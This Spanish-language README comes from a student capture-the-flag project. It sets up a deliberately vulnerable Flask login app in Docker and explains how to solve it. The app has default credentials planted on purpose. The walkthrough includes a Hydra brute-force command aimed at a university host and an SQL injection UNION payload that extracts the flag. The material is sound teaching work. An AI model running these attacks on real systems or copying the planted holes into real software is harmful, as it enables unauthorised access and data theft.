# Aplicacion Web Vulnerable

<table>
  <tr>
    <th>Autores</th>
    <th>Apellido</th>
    <th>Nombre</th>
  </tr>
  <tr>
    <td> &#9745; </td>
    <td>Adra</td>
    <td>Federico</td>
  </tr>
  <tr>
    <td> &#9745; </td>
    <td>Alfonsin</td>
    <td>Jeronimo</td>
  </tr>
  <tr>
    <td> &#9745; </td>
    <td>Reinoso</td>
    <td>Francisco</td>
  </tr>
</table>

---

## Dockerfile

```docker
FROM python:3.6.6-alpine3.8

ENV FLASK_APP /www/app.py
ENV FLASK_DEBUG 1
ENV FLASK_RUN_PORT 8888

RUN apk add bash gcc musl-dev mysql mariadb-dev build-base

ADD entrypoint.sh /entrypoint.sh

RUN mkdir /www

EXPOSE 8888

ENTRYPOINT [ "/entrypoint.sh" ]
```

## Docker-Compose.yml

```yml
version: '3'

services:

  login:
    container_name: trabajo-integrador-eshs
    image: practica2
    restart: always
    volumes:
      - "./python_login/www/:/www/"
    ports:
      - 42069:8888

```

## ¿Como setear una flag?

Ir al archivo `trabajo_integrador/ESHS/python_login/www/app.py` 

La flag esta definida en el codigo. <br>
Se debe eliminar el archivo `trabajo_integrador/ESHS/python_login/www/test.db` <br>
Descomentar la siguiente seccion de codigo en _app.py_ :
```python
#FLAG = "flag{FLAG_NAME}" 
#db.create_all()
#db.session.add(User(username='admin', password='admin',email='',role='adminFalso'))
#db.session.add(User(username='su', password='qwerty',email='yonosoyCarlos@carlosMail.com',role='adminReal'))
#db.session.add(User(username='carlos', password='bien hecho', email='felicitaciones@quetengasunhermosodia.com.ar.us.xDDDD.saludosbrodarrrrrrrrr',role=f'{FLAG}'))
#db.session.commit()
```

Si por alguna razon no tiene docker corriendo:
```
sudo systemctl unmask docker
systemctl start docker
```

Ejecutar `./run.sh` para correr la aplicacion. <br>
Detener la aplicacion y volver a comentar el codigo anteriormente mencionado. <br>
Recuerde ejecutar `docker-compose down`. <br>
Volver a ejecutar `./run.sh` para correr la aplicacion. <br>

## ¿Como explotar la vulnerabilidad?

1. Vulnerabilidad en el `/login` <br>
   El usuario ingresa con credenciales por defecto. <br>
   Estas credenciales son las que se utilizan para el login: <br>
    <table>
      <tr>
        <th>Username</th>
        <th>Password</th>
      </tr>
      <tr>
        <td>admin</td>
        <td>admin</td>
      </tr>
    </table>

2. Vulnerabilidad en el `/loginCarlos` <br>
   El usuario ingresa con credenciales por muy usuales. <br>
   Si bien el usuario es medianamente mas rebuscado, sigue siendo el usuario por defecto en varias aplicaciones. <br>
   Estas credenciales son las que se utilizan para el loginCarlos: <br>
    <table>
      <tr>
        <th>Username</th>
        <th>Password</th>
      </tr>
      <tr>
        <td>su</td>
        <td>qwerty</td>
      </tr>
    </table>

    Notar que como los mensajes de error son relativamente aleatorios, uno pensaría que esto inutiliza Hydra. Sin embargo, dejamos de todas formas el mismo mensaje de error en caso de que el **username** sea correcto. <br>
    Una vez averiguado el mismo, el mensaje de error para distintas contraseñas sí es igual:
    <span style="color: #FF4000;">"Clave incorrecta! :D"</span>

    Ejemplo con Hydra:
    ```
    hydra -l su -P rockyou.txt -V "https-form-post://eshs2022.dsa.linti.unlp.edu.ar/loginCarlos:username=^USER^&password=^PASS^:F=Clave incorrecta"
    ```

3. Una vez que se explota la vulnerabilidad, se obtiene el <br> `/infoUsuario?username=su` <br>
En este caso, se puede hacer una Inyeccion SQL para obtener datos de la Base de Datos. <br> 
Si queremos acceder directamente a la flag, usamos el payload:

   ```
   http://localhost:42069/infoUsuario?username=asd' UNION SELECT username,username,role,role,role FROM user WHERE username!='admin' AND username!='su
   ```
    Se puede ver entonces que la flag se encuentra como: <br>
    `<a href="mailto:flag{FLAG_NAME}">flag{FLAG_NAME}</a>`


## Hint para el CTF

La hint que proponemos es:
- Pista para la pistita -> 64-62-58-45-32